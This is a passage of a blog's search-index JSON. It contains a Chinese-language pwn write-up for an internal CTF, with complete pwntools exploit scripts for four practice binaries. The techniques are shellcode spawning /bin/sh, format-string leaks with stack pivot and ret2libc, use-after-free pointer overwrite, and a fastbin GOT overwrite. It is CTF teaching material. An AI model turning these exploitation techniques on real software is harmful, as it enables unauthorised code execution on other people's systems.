{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u4e3b\u9875 \u00b6 \u8fd9\u91cc\u662fginben\u7684\u535a\u5ba2 \u4e3b\u8981\u7528\u6765\u8bb0\u5f55CTF\u7684writeup\u8fd8\u6709\u5b66\u4e60\u7b14\u8bb0\uff08\u4ee5\u540e\u4f1a\u9010\u6e10\u52a0\u8fdb\u6765\uff09 \u6709\u9519\u8bef\u7684\u5730\u65b9\u6b22\u8fce\u5e08\u5085\u4eec\u6307\u51fa \u5173\u4e8e\u6211 \u00b6 pwn\u5f1f\u5f1f\uff0c\u6df1\u5733\u5927\u5b66\u8ba1\u8f6f\u5927\u56db\u5b66\u751f \u5927\u4e8c\u7684\u65f6\u5019\u901a\u8fc7\u8ba1\u7b97\u673a\u7cfb\u7edf\u8bfe\u63a5\u89e6\u9006\u5411\u5de5\u7a0b\u548c\u4e8c\u8fdb\u5236\u6f0f\u6d1e\uff0c\u5927\u4e09\u5f00\u59cb\u771f\u6b63\u63a5\u89e6CTF\u5e76\u5f00\u59cb\u5b66pwn\uff0c\u867d\u7136\u5230\u73b0\u5728\u8fd8\u662f\u8521\u5f97\u62a0\u811a\u53ea\u4f1a\u505a\u5957\u8def\u9898\uff0c\u4f46\u603b\u7b97\u6709\u4e86\u70b9\u660e\u786e\u7684\u65b9\u5411 CTF id\uff1aobliviate\uff0c\u6765\u6e90\u4e8e\u54c8\u5229\u6ce2\u7279\u7684\u5492\u8bed\uff0c\u610f\u4e3a\"\u4e00\u5fd8\u7686\u7a7a\"==>\u5565\u90fd\u8bb0\u4e0d\u4f4f\uff0c\u6240\u4ee5\u6709\u4e86\u535a\u5ba2\u7684\u8bde\u751f\u3002\u4ee5\u540e\u8bf4\u4e0d\u5b9a\u8003\u8651\u6539id\uff0c\u770b\u5fc3\u60c5 \u8054\u7cfb\u6211 \u00b6 \u90ae\u4ef6\uff1a lamginbin@gmail.com or 331036432@qq.com","title":"\u4e3b\u9875"},{"location":"#_1","text":"\u8fd9\u91cc\u662fginben\u7684\u535a\u5ba2 \u4e3b\u8981\u7528\u6765\u8bb0\u5f55CTF\u7684writeup\u8fd8\u6709\u5b66\u4e60\u7b14\u8bb0\uff08\u4ee5\u540e\u4f1a\u9010\u6e10\u52a0\u8fdb\u6765\uff09 \u6709\u9519\u8bef\u7684\u5730\u65b9\u6b22\u8fce\u5e08\u5085\u4eec\u6307\u51fa","title":"\u4e3b\u9875"},{"location":"#_2","text":"pwn\u5f1f\u5f1f\uff0c\u6df1\u5733\u5927\u5b66\u8ba1\u8f6f\u5927\u56db\u5b66\u751f \u5927\u4e8c\u7684\u65f6\u5019\u901a\u8fc7\u8ba1\u7b97\u673a\u7cfb\u7edf\u8bfe\u63a5\u89e6\u9006\u5411\u5de5\u7a0b\u548c\u4e8c\u8fdb\u5236\u6f0f\u6d1e\uff0c\u5927\u4e09\u5f00\u59cb\u771f\u6b63\u63a5\u89e6CTF\u5e76\u5f00\u59cb\u5b66pwn\uff0c\u867d\u7136\u5230\u73b0\u5728\u8fd8\u662f\u8521\u5f97\u62a0\u811a\u53ea\u4f1a\u505a\u5957\u8def\u9898\uff0c\u4f46\u603b\u7b97\u6709\u4e86\u70b9\u660e\u786e\u7684\u65b9\u5411 CTF id\uff1aobliviate\uff0c\u6765\u6e90\u4e8e\u54c8\u5229\u6ce2\u7279\u7684\u5492\u8bed\uff0c\u610f\u4e3a\"\u4e00\u5fd8\u7686\u7a7a\"==>\u5565\u90fd\u8bb0\u4e0d\u4f4f\uff0c\u6240\u4ee5\u6709\u4e86\u535a\u5ba2\u7684\u8bde\u751f\u3002\u4ee5\u540e\u8bf4\u4e0d\u5b9a\u8003\u8651\u6539id\uff0c\u770b\u5fc3\u60c5","title":"\u5173\u4e8e\u6211"},{"location":"#_3","text":"\u90ae\u4ef6\uff1a lamginbin@gmail.com or 331036432@qq.com","title":"\u8054\u7cfb\u6211"},{"location":"\u53cb\u60c5\u94fe\u63a5/","text":"\u53cb\u60c5\u94fe\u63a5 \u00b6 \u4ee5\u4e0b\u4e0d\u5206\u5148\u540e Apeng https://apeng.fun/ domain https://blog.52szu.tech/ decade https://wulidecade.cn/ Lantern https://lantern.cool/","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"\u53cb\u60c5\u94fe\u63a5/#_1","text":"\u4ee5\u4e0b\u4e0d\u5206\u5148\u540e Apeng https://apeng.fun/ domain https://blog.52szu.tech/ decade https://wulidecade.cn/ Lantern https://lantern.cool/","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/","text":"\u6240\u6709\u9898\u76ee\u548c\u6e90\u6587\u4ef6\uff1a \u94fe\u63a5 face wall project \u00b6 checksec\u5206\u6790 \u00b6 [*] '/home/ljb/ctf/aurora/face_wall_project/break_the_wall' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments \u9664\u4e86PIE\u5f00\u542f\uff0c\u5176\u4ed6\u5168\u5173 IDA\u6253\u5f00\uff0cF5\uff0c\u53d1\u73b0\u5982\u4e0b\u62a5\u9519\u3002\u627e\u5230\u90a3\u4e00\u884c\uff0c\u53d1\u73b0\u662f\u8c03\u7528\u4e86buf\u7684\u6307\u4ee4\uff0c\u7406\u89e3\u4e4b\u540e\u628a\u90a3\u4e00\u884cnop\u6389\uff0c\u518dF5\uff0c\u5c31\u80fd\u6b63\u5e38\u5206\u6790\u4e86\u3002 \u5206\u6790\u53d1\u73b0\u662f\u8bfb\u516530\u5b57\u8282\u7684\u6570\u636e\u3002 \u7528strlen\u5224\u65ad\u6570\u636e\u957f\u5ea6\u8981\u5927\u4e8e29\uff0c\u5373\u957f\u5ea6\u8981\u7b49\u4e8e30\uff0c\u6240\u4ee5\u4e0d\u80fd\u67090\u622a\u65ad\u3002 \u68c0\u67e5\u6570\u636e\u4e2d\u662f\u5426\u6709\\x90\uff0c\u6240\u4ee5\u4e0d\u80fd\u6709nop\u6307\u4ee4\u3002 \u4e00\u4e2axor\u51fd\u6570\uff0c\u628a\u5947\u6570\u4f4d\u6570\u636e\u8fdb\u884c\u5f02\u6216\u5f97\u5230a\uff0c\u7136\u540e\u628a\u5076\u6570\u4f4d\u6570\u636e\u8fdb\u884c\u5f02\u6216\u5f97\u5230b\uff0c\u6bd4\u8f83a\u548cb\u662f\u5426\u76f8\u540c\uff0c\u5982\u679c\u76f8\u540c\u5219\u6267\u884c\u6570\u636e\u3002 \u89e3\u9898\u601d\u8def\uff1a \u00b6 \u663e\u7136\u662f\u8981\u6211\u4eec\u4f20\u5165shellcode\u4ece\u800c\u6267\u884cshellcode\u3002\u8981\u6c42\u957f\u5ea6\u4e3a30\uff0c\u4e14\u4e0d\u80fd\u7528nop\u6307\u4ee4\u586b\u5145\uff0c\u56e0\u6b64\u6700\u597d\u7684\u529e\u6cd5\u662f\u628a\u4e00\u4e9b\u65e0\u5173\u6307\u4ee4\u91cd\u590d\u6267\u884c\u3002\u53c8\u56e0\u4e3axor\u51fd\u6570\u7684\u6821\u9a8c\uff0c\u6211\u4eec\u9700\u8981\u8ba9shellcode\u957f\u5ea6\u4e3a29\uff0c\u6700\u540e\u8fdb\u884c\u8ba1\u7b97\u586b\u5145\u7b2c30\u4f4d\uff0c\u4ece\u800c\u7ed5\u8fc7xor\u7684\u68c0\u67e5\u3002 exp: \u00b6 from pwn import * elf = ELF ( \"break_the_wall\" ) io = elf . process () #io=remote(\"123.207.32.26\",9004) libc = elf . libc #libc=ELF(\"\") #context.log_level='debug' context . bits = 64 sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive shellcode = asm ( 'xor rsi,rsi' ) shellcode += asm ( 'xor rdx,rdx' ) #execve\u7b2c\u4e8c\u4e2a\u53c2\u6570rsi\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570rdx\u7f6e0 shellcode += asm ( 'xor rax,rax' ) #\u7cfb\u7edf\u8c03\u7528rax\u4f4d\u6e050. shellcode += asm ( 'push rax' ) shellcode += asm ( 'push rax' ) shellcode += asm ( 'push rax' ) #\u586b\u5145\u4f7f\u5f97shellcode\u4e3a29\u4f4d\u3002\u540c\u65f6\u56e0\u4e3arax=0\uff0c\u53ef\u4ee5\u8fbe\u5230\u5bf9'//bin/sh'0\u622a\u65ad\u7684\u6548\u679c shellcode += asm ( 'mov rbx,0x68732f2f6e69622f' ) #'//bin/sh' shellcode += asm ( 'push rbx' ) shellcode += asm ( 'push rsp' ) #rsp\u662f'//bin/sh'\u7684\u5730\u5740 shellcode += asm ( 'pop rdi' ) shellcode += asm ( 'mov al,0x3b' ) shellcode += asm ( 'syscall' ) #execve('//bin/sh',0,0) print len ( shellcode ) #\u53e6\u4e00\u79cd\u5199\u6cd5 ''' shellcode=asm('xor rsi,rsi') shellcode+=asm('xor rdx,rdx') shellcode+=asm('xor rax,rax') shellcode+=asm('push rax') shellcode+=asm('push rax') shellcode+=asm('mov rbx,0x68732f2f6e69622f') shellcode+=asm('push rbx') shellcode+=asm('mov rdi,rsp')#\u53d8\u52a8\u5728\u8fd9\u91cc\uff0c\u76f4\u63a5\u628arsp\u653e\u5230rdi shellcode+=asm('mov al,0x3b') shellcode+=asm('syscall') print len(shellcode) ''' #xor\u6821\u9a8c temp = 0 for i in range ( 15 ): temp ^= ord ( shellcode [ 2 * i ]) temp1 = 0 for i in range ( 14 ): temp ^= ord ( shellcode [ 2 * i + 1 ]) shellcode += chr ( temp ^ temp1 ) print len ( shellcode ) sa ( 'ask? \\n ' , shellcode ) shell () flag: PS\uff1a\u672c\u9898\u539f\u578bDEFCON QUALIFIER 2019 SPEED RUN 003\uff0c\u4e3b\u8981\u662f\u5bf9xor\u51fd\u6570\u505a\u4e86\u5c0f\u6539\u52a8\u3002 PPS\uff1a\u672c\u9898\u5f69\u86cb\uff1a\u300a\u4e09\u4f53\u300b-\u9762\u58c1\u8ba1\u5212 baby stack \u00b6 checksec\u5206\u6790 \u00b6 [*] '/home/ljb/ctf/aurora/exam/exam' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled \u53ea\u6709canary\u88ab\u5173\u95ed\uff0c\u5176\u4ed6\u9632\u62a4\u5168\u5f00 IDA F5\u5206\u6790 \u00b6 \u4e3b\u8981\u529f\u80fd\uff1a readQuestion\uff0c\u6ca1\u7528\uff0c3\u4e2aputs\u8f93\u51fa\u56fa\u5b9a\u5b57\u7b26\u4e32\u3002 writeAnswer\uff0c\u8bfb\u51650x80\u4e2a\u5b57\u8282\uff0c\u5b58\u57280x10\u4e2a\u5b57\u8282\u6808\u6ea2\u51fa\uff0c\u540c\u65f6\u4f1a\u628a\u8bfb\u5165\u6570\u636e\u590d\u5236\u4e00\u4efd\u5230bss\u6bb5\u4e2d\u7684answersheet\u3002 askTeacher\uff0c\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e takeAnap\uff0csleep\u4e24\u5c0f\u65f6\u3002\u3002\u3002 backdoor\uff0c\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u9700\u8981\u4f20\u4e00\u4e2a\u53c2\u6570\u3002\u53c2\u6570\u7b49\u4e8e30\uff0c\u4e14\u5168\u5c40\u53d8\u91cfpoint=666\uff0c\u5373\u53ef\u5f97\u5230flag\u3002 \u89e3\u9898\u601d\u8def\uff1a \u00b6 \u7531\u4e8e\u5f00\u4e86PIE\uff0c\u56e0\u6b64leak\u9700\u8981\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002\u53c8\u7531\u4e8e\u6267\u884cbackdoor\u9700\u8981\u53c2\u6570\uff0c\u56e0\u6b64\u81f3\u5c11\u9700\u89810x20\uff08ebp+pop_rdi+30+backdoor\uff09\u4e2a\u5b57\u8282\u7684\u6808\u6ea2\u51fa\u624d\u80fd\u6784\u9020ROP\u94fe\u3002\u7531\u6b64\u60f3\u5230\u53ef\u4ee5\u901a\u8fc7\u6808\u8fc1\u79fb\u6765\u8fbe\u6210\u3002 \u6808\u8fc1\u79fb\u9996\u5148\u9700\u8981\u627e leave;ret; \u3002\u8fd9\u6b21\u4ece\u9898\u76ee\u6587\u4ef6\u4e2d\u627e\uff0c\u7531\u4e8e\u5f00\u4e86PIE\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981leak\u51faPIE\u3002\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u76f4\u63a5\u6808\u8fc1\u79fb\u5230answersheet\u4e2d\uff0c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u628aGOT\u8868\u7834\u574f\u6389\u4ece\u800c\u62a5\u9519\u3002\u56e0\u6b64\u6211\u4eec\u8003\u8651\u628a\u6808\u8fc1\u79fb\u5230\u6808\u4e2d\uff0c\u5373writeAnswer\u4e2d\u8bfb\u5165\u6570\u636e\u5b58\u7684\u5730\u65b9\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981leak\u51fa\u6808\u5730\u5740\u3002 \u4e4b\u540e\u6784\u9020ROP\u94fe\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u3002\u4e00\u79cd\u662f\u5148\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6539\u4e86point\u5168\u5c40\u53d8\u91cf\uff0c\u63a5\u7740\u8c03\u7528backdoor\u51fd\u6570\u3002\u53e6\u4e00\u79cd\u662f\u901a\u8fc7ret2libc\uff0c\u5148leak\u51falibc\u51fd\u6570\u7684\u5730\u5740\u518d\u8c03\u7528system('/bin/sh') exp: \u00b6 from pwn import * elf = ELF ( \"exam\" ) #io=elf.process() io = remote ( \"123.207.32.26\" , 9002 ) libc = elf . libc #libc=ELF(\"\") context . log_level = 'debug' sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive def menu ( choice ): sla ( \"room\" , str ( choice )) def write ( payload ): menu ( 2 ) sa ( \"paper: \\n \" , payload ) sla ( \"[Y/N] \\n \" , 'Y' ) def ask ( payload ): menu ( 3 ) sa ( \"question? \\n \" , payload ) csu_init = 0x15f0 backdoor = 0x11c5 bss = 0x4040 leave_ret = 0x12c5 #ROPgadget --binary exam --only 'leave|ret' pop_rdi = 0x164b #ROPgadget --binary exam --only 'pop|ret'|grep rdi point = 0x4014 #gdb.attach(io) payload = '%24$paaa%13$pbbb%19$pccc%20$pddd' ask ( payload ) ru ( \"is : \" ) #leak PIE csu_init_addr = int ( ru ( \"aaa\" , True ), 16 ) pie = csu_init_addr - csu_init print \"pie:\" + hex ( pie ) #leak libc puts_addr = int ( ru ( \"bbb\" , True ), 16 ) puts_addr = puts_addr - 362 libcbase = puts_addr - libc . sym [ 'puts' ] print \"libcbase:\" + hex ( libcbase ) libc . address = libcbase #leak canary canary = int ( ru ( 'ccc' , True ), 16 ) print 'canary:' + hex ( canary ) #leak stack target = int ( ru ( 'ddd' , True ), 16 ) target -= 0x90 #\u8fd9\u91cc\u9700\u8981gdb\u8c03\u8bd5\u89c2\u5bdf print 'target:' + hex ( target ) #1:stack pivot+ret2libc ''' payload=p64(1) payload+=p64(pie+pop_rdi) payload+=p64(libc.search('/bin/sh').next()) payload+=p64(libc.sym['system']) payload+='\\x90'*(0x68-len(payload)) payload+=p64(canary) payload+=p64(target) payload+=p64(pie+leave_ret) write(payload) shell() ''' ''' #2:fmtstr+stack pivot+backdoor payload='%666c%8$hn' payload+=(16-len(payload))*'a' payload+=p64(pie+point) ask(payload) payload=p64(1) payload+=p64(pie+pop_rdi) payload+=p64(30) payload+=p64(pie+backdoor) payload+='\\x90'*(0x68-len(payload)) payload+=p64(canary) payload+=p64(target) payload+=p64(pie+leave_ret) write(payload) print io.recv() ''' PS\uff1a\u672c\u9898\u539f\u6765\u662f\u5f00\u4e86canary\u9632\u62a4\u7684\uff0c\u540e\u6765\u91cd\u65b0\u7f16\u8bd1\u7684\u65f6\u5019\u5fd8\u8bb0\u4e86\u52a0\uff0c\u56e0\u6b64exp\u4e2d\u8fd8\u6709leak canary\u8fd9\u4e00\u6b65\u3002 PPS\uff1a\u672c\u9898\u5f69\u86cb\uff1a\u6bd4\u8d5b\u7b2c\u4e00\u5929\u662f6\u67088\u53f7\uff0c\u521a\u597d\u662f\u9ad8\u8003\u7b2c\u4e8c\u5929\uff0c\u56e0\u6b64\u9898\u76ee\u4e2d\u7684\u6545\u4e8b\u90fd\u662f\u9ad8\u8003\u80cc\u666f\u3002\u7f05\u6000\u5927\u5bb6\u901d\u53bb\u7684\u9ad8\u4e2d\u9752\u6625\u3002 baby heap \u00b6 checksec\u5206\u6790 \u00b6 [*] '/home/ljb/ctf/aurora/double/double' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u9664\u4e86RELRO\uff0c\u5176\u4ed6\u5168\u5f00\u3002 IDA F5\u5206\u6790 \u00b6 \u4e3b\u8981\u529f\u80fd\uff1a add info\uff0c\u7533\u8bf7\u4e00\u4e2a0x10\u5927\u5c0f\u7684\u5806\u3002\u524d8\u5b57\u8282\u5b58message\u5730\u5740\uff0c\u540e8\u5b57\u8282\u5b58puts\u51fd\u6570\u5730\u5740\u3002message\u662f\u6839\u636e\u8f93\u5165\u5927\u5c0fmalloc\u7684\u5806\u3002 del info\uff0c\u5220\u9664info\u3002\u8fd9\u91cc\u662f\u5148\u5220\u9664info\u5806\uff0c\u518d\u5220\u9664\u5bf9\u5e94message\u5806\uff0c\u540c\u65f6\u5b58\u5728UAF\u6f0f\u6d1e\u3002 show info\uff0c\u8f93\u5165info index\u8f93\u51fa\u5bf9\u5e94message\u5b58\u7684\u4fe1\u606f\u3002\u6ce8\u610f\u8fd9\u91cc\u7684\u8f93\u51fa\u8c03\u7528\u7684\u662finfo\u4e2d\u7684puts\u5730\u5740\u3002\u8fd9\u91ccindex\u7ba1\u7406\u5f88\u597d\u4e0d\u5b58\u5728\u6ea2\u51fa\u3002 \u89e3\u9898\u601d\u8def\uff1a \u00b6 \u7531\u4e8e\u5b58\u5728UAF\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u5229\u7528fastbin\u7684\u7279\u6027\u3002\u5148leak\u51falibc\uff0c\u7136\u540e\u628aputs\u51fd\u6570\u5730\u5740\u6539\u4e3asystem\u51fd\u6570\u5730\u5740\uff0cmessage\u5199'/bin/sh'\uff0c\u4ece\u800c\u6267\u884csystem('/bin/sh') get shell\u3002 exp\uff1a \u00b6 from pwn import * elf = ELF ( \"double\" ) #io=elf.process() #io=elf.process(,env={'LD_PRELOAD':'.so'}) io = remote ( \"123.207.32.26\" , 9001 ) libc = elf . libc #libc=ELF(\"\") context . log_level = 'debug' sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive def menu ( choice ): sla ( \"choice: \\n \" , str ( choice )) def addinfo ( length , message = 'jb' ): menu ( 1 ) sla ( \"length \\n \" , str ( length )) sa ( \"message \\n \" , message ) def delinfo ( index ): menu ( 2 ) sla ( \"delete \\n \" , str ( index )) def showinfo ( index ): menu ( 3 ) sla ( \"watch \\n \" , str ( index )) addinfo ( 0x10 ) #\u7533\u8bf7\u548cinfo\u540c\u6837\u5927\u5c0f\u7684\u5806\uff0c\u4ece\u800c\u4f7f\u5f97message\u548cinfo\u88abfree\u540e\u8fdb\u5165\u540c\u4e00\u4e2afastbin delinfo ( 0 ) addinfo ( 0x10 , 'a' * 8 ) #\u56e0\u4e3a\u4e0a\u9762\u540efree\u7684\u662fmessage\u5806\uff0c\u56e0\u6b64info[1]\u7533\u8bf7\u7684\u662finfo[0]->message\uff0cinfo[1]->message\u7533\u8bf7\u7684\u662finfo[0] showinfo ( 1 ) #\u7531\u4e8einfo[1]->message\u7533\u8bf7\u7684\u662finfo[0]\uff0c\u56e0\u6b64\u540e8\u5b57\u8282\u662fputs\u51fd\u6570\u5730\u5740\uff0c\u4ece\u800cleak libc ru ( 'a' * 8 ) puts_addr = ru ( ' \\n ' , True ) puts_addr = u64 ( puts_addr + ' \\x00\\x00 ' ) libcbase = puts_addr - libc . sym [ 'puts' ] print hex ( libcbase ) libc . address = libcbase addinfo ( 0x10 ) delinfo ( 2 ) addinfo ( 0x10 , p64 ( libc . search ( '/bin/sh' ) . next ()) + p64 ( libc . sym [ 'system' ])) #\u91cd\u65b0\u7533\u8bf7\uff0c\u53c2\u8003\u4e0a\u9762\u7684\u64cd\u4f5c\uff0c\u628ainfo->message\u6539\u4e3a'/bin/sh'\u5730\u5740\uff0cputs\u51fd\u6570\u5730\u5740\u6539\u4e3asystem\u51fd\u6570\u5730\u5740 showinfo ( 2 ) #\u901a\u8fc7show\u529f\u80fd\u89e6\u53d1system\u51fd\u6570 shell () PS\uff1a\u672c\u9898\u9898\u76ee\u8ddf\u56fd\u8d5b\u4e00\u81f4\uff0c\u90fd\u662fdouble\uff0c\u4f46\u5229\u7528\u65b9\u6cd5\u90fd\u4e0d\u662fdouble free\u3002\u672c\u9898flag\u4e3aAurora{n0t_double_free_bu7_double_types_2333}\u3002\u610f\u5728\u8bf4\u660edouble\u5e76\u4e0d\u4e00\u5b9a\u662f\u6307double free\uff0c\u6709\u53ef\u80fd\u662f\u6307\u4e24\u79cd\u5806\u7684\u7c7b\u578bdouble type\uff0c\u4e0d\u8981\u88ab\u60ef\u6027\u601d\u7ef4\u4e86\uff0c\u56e0\u6b64\u8fd9\u9898\u4e5f\u7b97\u7c7b\u578b\u6df7\u6dc6\u7684\u4e00\u79cd\u3002 child heap \u00b6 checksec\u5206\u6790 \u00b6 [*] '/home/ljb/ctf/aurora/notebook/notebook' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) IDA F5\u5206\u6790\uff08\u672c\u9898IDA\u5206\u6790\u6587\u4ef6\u4e5f\u5728\u94fe\u63a5\u4e2d\uff09 \u00b6 \u4e3b\u8981\u529f\u80fd\uff1a new\uff0c\u6309\u7167\u8f93\u5165\u7684\u5927\u5c0f\u7533\u8bf7\u5806\uff0c\u5728\u5168\u5c40\u6570\u7ec4record\u4e2d\uff0c\u5148\u5b58size\uff0c\u518d\u5b58\u5806\u5730\u5740\u3002\u6ce8\u610f\u9898\u76ee\u4e2d\u5199\u7684read\u51fd\u6570\u9700\u8981\u8f93\u5165\u56de\u8f66\u6765\u7ed3\u675f\uff0c\u5426\u5219\u957f\u5ea6\u4e0d\u591f\u5c31\u4f1a\u76f4\u63a5exit(1)\u3002 edit\uff0c\u5148\u8f93\u5165index\uff0c\u518d\u8f93\u5165\u5927\u5c0f\uff0c\u7136\u540e\u5bf9record\u4e2dindex\u5bf9\u5e94\u7684\u5806\u5185\u5bb9\u8fdb\u884c\u7f16\u8f91\u3002\u8fd9\u91cc\u5bf9\u8f93\u5165\u5927\u5c0f\u4e0d\u68c0\u67e5\uff0c\u56e0\u6b64\u5b58\u5728\u5806\u6ea2\u51fa\u3002 delete\uff0c\u8f93\u5165index\uff0c\u91ca\u653e\u5806\uff0c\u540c\u65f6\u628arecord\u4e2d\u7684size\u548c\u5806\u5730\u5740\u7f6e0\u3002\u8fd9\u91cc\u5b58\u5728\u6570\u7ec4\u8d8a\u754c\u3002 look\uff0c\u8f93\u5165index\uff0c\u67e5\u770b\u5bf9\u5e94\u5806\u4fe1\u606f\u3002\u8fd9\u91cc\u540c\u6837\u5b58\u5728\u6570\u7ec4\u8d8a\u754c\u3002 \u89e3\u9898\u601d\u8def\uff1a \u00b6 \u7531\u4e8e\u5b58\u5728\u5806\u6ea2\u51fa\uff0c\u4e14\u5bf9\u7533\u8bf7\u5806\u7684size\u65e0\u9650\u5236\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651fastbin attack\u4e2d\u7684Arbitrary Alloc\uff0c\u4f2a\u9020\u5806\u5230\u5168\u5c40\u6570\u7ec4record\u4e2d\uff0c\u4ece\u800c\u63a7\u5236record\u7684\u5185\u5bb9\u3002\u7531\u4e8e\u6ca1\u6709\u5f00\u542fFULL RELRO\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u6539GOT\u8868\u3002\u628afree\u6539\u6210system\u4ece\u800cget shell\u3002 exp: \u00b6 from pwn import * elf = ELF ( \"notebook\" ) #io=elf.process() #io=elf.process(,env={'LD_PRELOAD':'.so'}) io = remote ( \"123.207.32.26\" , 9003 ) libc = elf . libc #libc=ELF(\"\") context . log_level = 'debug' sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive def menu ( choice ): sla ( \"your choice? \\n \" , str ( choice )) def new ( size , content = 'jb \\n ' ): menu ( 1 ) sla ( \"notebook: \\n \" , str ( size )) sa ( \"content: \\n \" , content ) def edit ( index , size , content ): menu ( 2 ) sla ( \"notebook: \\n \" , str ( index )) sla ( \"lenth of notebook: \\n \" , str ( size )) io . send ( content ) def delete ( index ): menu ( 3 ) sla ( \"index: \\n \" , str ( index )) def look ( index ): menu ( 4 ) sla ( \"index: \\n \" , str ( index )) #gdb.attach(io) new ( 0x61 ) #0 new ( 0x50 ) #1 delete ( 1 ) #\u6b64\u65f6fastbin\u4e2d\u53ea\u6709\u58061 payload = 'a' * 0x60 #\u586b\u5145\u58060 payload += p64 ( 0 ) + p64 ( 0x61 ) #\u58061\u7684prev_size\u548csize payload += p64 ( 0x6020a0 - 8 ) + ' \\n ' #\u4f2a\u9020\u58061\u7684fd\uff0c\u6307\u5411record-8\uff0c\u6b64\u65f6record[0]->size\u5b58\u7684\u662f0x61\uff0c\u548c\u58061\u7684size\u57df\u76f8\u540c\uff0c\u548c\u58061\u5904\u4e8e\u540c\u4e00\u4e2afastbin edit ( 0 , 0x80 , payload ) new ( 0x50 ) #1\uff0c\u539f\u6765\u7684\u58061 new ( 0x50 ) #2\uff0cfake heap\uff0c\u5806\u5730\u5740\u662f&record[-1]->mesg_addr\uff0cuserdata\u5730\u5740\uff08\u5373malloc\u8fd4\u56de\u7684\u5730\u5740\uff09\u662f&record[0]->mesg_addr new ( 0x10 , '/bin/sh \\x00\\n ' ) #3 payload = p64 ( elf . got [ 'free' ]) edit ( 2 , 0x10 , payload + ' \\n ' ) #\u76f8\u5f53\u4e8e\u6539\u4e86record[0]->mesg_addr\u4e3afree\u7684got\u8868\u5730\u5740 #leak libc look ( 0 ) #\u7531\u4e8erecord[0]->mesg_addr=free@got\uff0c\u56e0\u6b64\u67e5\u770b\u4f1a\u76f4\u63a5\u5f97\u5230free\u7684got\u8868\u5185\u5bb9\u5373free\u5b9e\u9645\u5730\u5740 ru ( \"0:\" ) mesg = ru ( \" \\n \" , True ) free_addr = u64 ( mesg + ' \\x00\\x00 ' ) libcbase = free_addr - libc . sym [ 'free' ] print \"libcbase:\" + hex ( libcbase ) libc . address = libcbase payload = p64 ( libc . sym [ 'system' ])[ 0 : 7 ] edit ( 0 , 0x10 , payload + ' \\n ' ) #\u6539*(record[0]->mesg_addr)\u4e3asystem\u5730\u5740 delete ( 3 ) #\u8c03\u7528system('/bin/sh') shell ()","title":"Aurora\u5185\u90e8\u8d5bpwn writeup"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#face-wall-project","text":"","title":"face wall project"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#checksec","text":"[*] '/home/ljb/ctf/aurora/face_wall_project/break_the_wall' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments \u9664\u4e86PIE\u5f00\u542f\uff0c\u5176\u4ed6\u5168\u5173 IDA\u6253\u5f00\uff0cF5\uff0c\u53d1\u73b0\u5982\u4e0b\u62a5\u9519\u3002\u627e\u5230\u90a3\u4e00\u884c\uff0c\u53d1\u73b0\u662f\u8c03\u7528\u4e86buf\u7684\u6307\u4ee4\uff0c\u7406\u89e3\u4e4b\u540e\u628a\u90a3\u4e00\u884cnop\u6389\uff0c\u518dF5\uff0c\u5c31\u80fd\u6b63\u5e38\u5206\u6790\u4e86\u3002 \u5206\u6790\u53d1\u73b0\u662f\u8bfb\u516530\u5b57\u8282\u7684\u6570\u636e\u3002 \u7528strlen\u5224\u65ad\u6570\u636e\u957f\u5ea6\u8981\u5927\u4e8e29\uff0c\u5373\u957f\u5ea6\u8981\u7b49\u4e8e30\uff0c\u6240\u4ee5\u4e0d\u80fd\u67090\u622a\u65ad\u3002 \u68c0\u67e5\u6570\u636e\u4e2d\u662f\u5426\u6709\\x90\uff0c\u6240\u4ee5\u4e0d\u80fd\u6709nop\u6307\u4ee4\u3002 \u4e00\u4e2axor\u51fd\u6570\uff0c\u628a\u5947\u6570\u4f4d\u6570\u636e\u8fdb\u884c\u5f02\u6216\u5f97\u5230a\uff0c\u7136\u540e\u628a\u5076\u6570\u4f4d\u6570\u636e\u8fdb\u884c\u5f02\u6216\u5f97\u5230b\uff0c\u6bd4\u8f83a\u548cb\u662f\u5426\u76f8\u540c\uff0c\u5982\u679c\u76f8\u540c\u5219\u6267\u884c\u6570\u636e\u3002","title":"checksec\u5206\u6790"},{"location":"CTF 